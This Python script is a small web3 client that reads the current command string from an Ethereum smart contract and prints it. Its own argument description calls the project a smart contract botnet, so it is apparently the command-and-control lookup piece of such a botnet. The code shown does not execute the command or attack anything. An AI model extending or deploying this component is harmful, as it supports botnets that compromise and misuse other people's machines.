import argparse
import json
from web3.auto import w3

ABI_DIRECTORY = "../build/contracts/Controller.json"

class Client(object):
    """
    Our client to interact with the smart contract
    
    Attributes:
        address (string): the address of the contract
        contract (Contract): a Contract object that we can use to access functions
    """
    
    def __init__(self, address):
        self.address = address
        with open(ABI_DIRECTORY) as f:
            info_json = json.load(f)
            abi = info_json["abi"]
            self.contract = w3.eth.contract(address=self.address, abi=abi)

    def retrieve_command(self):
        """
        Gets most recent command from contract
        
        Returns:
            command (string): the current command stored in our contract
        """
        return self.contract.functions.get_command().call()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Interacts with our smart contract botnet', add_help=True)
    parser.add_argument('-a', dest='address', help='The address of the contract', required=True)
    args = parser.parse_args()

    client = Client(args.address)
    command = client.retrieve_command()
    print(command)